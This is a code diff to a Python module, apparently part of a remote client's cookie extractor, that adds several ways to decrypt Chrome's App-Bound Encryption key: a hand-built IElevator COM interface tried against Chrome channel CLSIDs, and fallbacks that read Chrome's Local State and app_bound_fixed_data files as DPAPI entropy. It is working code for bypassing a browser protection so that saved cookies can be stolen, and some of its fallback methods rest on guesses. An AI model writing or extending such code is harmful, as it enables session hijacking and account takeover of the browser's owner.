@@ -173,7 +173,13 @@ def _decrypt_abe_key(encrypted_key: bytes, dpapi) -> Optional[bytes]:
     # Remove APPB prefix
     key_data = encrypted_key[4:]
     
-    # Method 1: Direct DPAPI (works on some configurations)
+    # Method 1: Try IElevator COM interface first (most reliable for ABE)
+    result = _try_ielevator_decrypt(encrypted_key)
+    if result:
+        logger.info("ABE key decrypted via IElevator COM")
+        return result
+    
+    # Method 2: Direct DPAPI (works on some configurations)
     try:
         decrypted = dpapi.CryptUnprotectData(key_data, None, None, None, 0)[1]
         if decrypted and len(decrypted) >= 16:
@@ -182,7 +188,7 @@ def _decrypt_abe_key(encrypted_key: bytes, dpapi) -> Optional[bytes]:
     except Exception as e:
         logger.debug(f"Direct DPAPI decryption of ABE key failed: {e}")
     
-    # Method 2: Try with CRYPTPROTECT_UI_FORBIDDEN flag
+    # Method 3: Try with CRYPTPROTECT_UI_FORBIDDEN flag
     try:
         CRYPTPROTECT_UI_FORBIDDEN = 0x01
         decrypted = dpapi.CryptUnprotectData(key_data, None, None, None, CRYPTPROTECT_UI_FORBIDDEN)[1]
@@ -192,7 +198,7 @@ def _decrypt_abe_key(encrypted_key: bytes, dpapi) -> Optional[bytes]:
     except Exception:
         pass
     
-    # Method 3: Try with LOCAL_MACHINE flag
+    # Method 4: Try with LOCAL_MACHINE flag
     try:
         CRYPTPROTECT_LOCAL_MACHINE = 0x04
         decrypted = dpapi.CryptUnprotectData(key_data, None, None, None, CRYPTPROTECT_LOCAL_MACHINE)[1]
@@ -202,7 +208,7 @@ def _decrypt_abe_key(encrypted_key: bytes, dpapi) -> Optional[bytes]:
     except Exception:
         pass
     
-    # Method 4: Try decrypting full key with APPB prefix
+    # Method 5: Try decrypting full key with APPB prefix
     try:
         decrypted = dpapi.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
         if decrypted and len(decrypted) >= 16:
@@ -211,19 +217,160 @@ def _decrypt_abe_key(encrypted_key: bytes, dpapi) -> Optional[bytes]:
     except Exception:
         pass
     
-    # Method 5: Try IElevator COM interface
+    # Method 6: Try Chrome keyring method
+    result = _try_chrome_keyring_decrypt(encrypted_key)
+    if result:
+        logger.info("ABE key decrypted via Chrome keyring")
+        return result
+    
+    logger.warning("Failed to decrypt ABE key - all methods failed")
+    return None
+
+
+def _try_ielevator_decrypt(encrypted_data: bytes) -> Optional[bytes]:
+    """
+    Attempt decryption using Chrome's IElevator COM interface.
+    """
+    if os.name != "nt":
+        return None
+    
+    # Method 1: Try comtypes (most reliable)
     try:
-        from remote_client.cookie_extractor.app_bound_encryption import _try_ielevator_com_decrypt
-        result = _try_ielevator_com_decrypt(encrypted_key)
-        if result:
-            logger.info("ABE key decrypted via IElevator COM")
-            return result
+        import comtypes.client
+        from comtypes import GUID, COMMETHOD, HRESULT, IUnknown
+        from ctypes import POINTER, c_char_p, c_ulong, byref
+        
+        class IElevator(IUnknown):
+            _iid_ = GUID("{A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C}")
+            _methods_ = [
+                COMMETHOD([], HRESULT, 'RunRecoveryCRXElevated',
+                          (['in'], c_char_p, 'crx_path'),
+                          (['in'], c_char_p, 'browser_appid'),
+                          (['in'], c_char_p, 'browser_version'),
+                          (['in'], c_char_p, 'session_id'),
+                          (['in'], c_ulong, 'caller_proc_id'),
+                          (['out'], POINTER(c_ulong), 'proc_handle')),
+                COMMETHOD([], HRESULT, 'EncryptData',
+                          (['in'], c_ulong, 'protection_level'),
+                          (['in'], c_char_p, 'plaintext'),
+                          (['in'], c_ulong, 'plaintext_len'),
+                          (['out'], POINTER(c_char_p), 'ciphertext'),
+                          (['out'], POINTER(c_ulong), 'ciphertext_len')),
+                COMMETHOD([], HRESULT, 'DecryptData',
+                          (['in'], c_char_p, 'ciphertext'),
+                          (['in'], c_ulong, 'ciphertext_len'),
+                          (['out'], POINTER(c_char_p), 'plaintext'),
+                          (['out'], POINTER(c_ulong), 'plaintext_len')),
+            ]
+        
+        # Try different Chrome channel CLSIDs
+        clsids = [
+            "{708860E0-F641-4611-8895-7D867DD3675B}",  # Chrome Stable
+            "{DD2646BA-3707-4BF8-B9A7-038691A68FC2}",  # Chrome Beta
+            "{DA7FDCA5-2CAA-4637-AA17-0749F64F49D2}",  # Chrome Dev
+            "{3A84F9C2-6164-485C-A7D9-4B27F8AC3D58}",  # Chrome Canary
+        ]
+        
+        for clsid_str in clsids:
+            try:
+                clsid = GUID(clsid_str)
+                comtypes.client.CoInitialize()
+                try:
+                    elevator = comtypes.client.CreateObject(clsid, interface=IElevator)
+                    
+                    plaintext = c_char_p()
+                    plaintext_len = c_ulong()
+                    
+                    hr = elevator.DecryptData(
+                        encrypted_data,
+                        len(encrypted_data),
+                        byref(plaintext),
+                        byref(plaintext_len)
+                    )
+                    
+                    if hr == 0 and plaintext.value:
+                        return plaintext.value[:plaintext_len.value]
+                except Exception as e:
+                    logger.debug(f"IElevator {clsid_str} failed: {e}")
+                finally:
+                    try:
+                        comtypes.client.CoUninitialize()
+                    except:
+                        pass
+            except Exception as e:
+                logger.debug(f"IElevator CLSID {clsid_str} error: {e}")
+                continue
+    except ImportError:
+        logger.debug("comtypes not available for IElevator")
+    except Exception as e:
+        logger.debug(f"IElevator setup failed: {e}")
+    
+    return None
+
+
+def _try_chrome_keyring_decrypt(encrypted_key: bytes) -> Optional[bytes]:
+    """
+    Try to decrypt ABE key using Chrome's keyring file.
+    
+    Chrome stores additional key material in app_bound_fixed_data file.
+    """
+    if os.name != "nt":
+        return None
+    
+    try:
+        import win32crypt
+        
+        # Try to find Chrome's keyring/elevation data
+        chrome_user_data = Path(os.environ.get("LOCALAPPDATA", "")) / "Google" / "Chrome" / "User Data"
+        
+        # Check for app_bound_fixed_data
+        fixed_data_path = chrome_user_data / "Default" / "Network" / "app_bound_fixed_data"
+        if not fixed_data_path.exists():
+            fixed_data_path = chrome_user_data / "app_bound_fixed_data"
+        
+        if fixed_data_path.exists():
+            logger.debug(f"Found app_bound_fixed_data at {fixed_data_path}")
+            try:
+                fixed_data = fixed_data_path.read_bytes()
+                # The fixed data may contain additional entropy for decryption
+                # Try decrypting with this data as additional entropy
+                key_data = encrypted_key[4:] if encrypted_key.startswith(b"APPB") else encrypted_key
+                
+                decrypted = win32crypt.CryptUnprotectData(
+                    key_data, None, fixed_data, None, 0
+                )[1]
+                if decrypted and len(decrypted) >= 16:
+                    return decrypted
+            except Exception as e:
+                logger.debug(f"Chrome keyring decrypt with fixed_data failed: {e}")
+        
+        # Try to read elevation state from Local State
+        local_state_path = chrome_user_data / "Local State"
+        if local_state_path.exists():
+            try:
+                local_state = json.loads(local_state_path.read_text(encoding="utf-8"))
+                # Check for any additional decryption hints
+                os_crypt = local_state.get("os_crypt", {})
+                
+                # Some Chrome versions store additional key info
+                app_bound_key = os_crypt.get("app_bound_fixed_data")
+                if app_bound_key:
+                    additional_data = base64.b64decode(app_bound_key)
+                    key_data = encrypted_key[4:] if encrypted_key.startswith(b"APPB") else encrypted_key
+                    
+                    decrypted = win32crypt.CryptUnprotectData(
+                        key_data, None, additional_data, None, 0
+                    )[1]
+                    if decrypted and len(decrypted) >= 16:
+                        return decrypted
+            except Exception as e:
+                logger.debug(f"Chrome Local State keyring decrypt failed: {e}")
+    
     except ImportError:
         pass
     except Exception as e:
-        logger.debug(f"IElevator COM decryption failed: {e}")
+        logger.debug(f"Chrome keyring method failed: {e}")
     
-    logger.warning("Failed to decrypt ABE key - all methods failed")
     return None
 
 
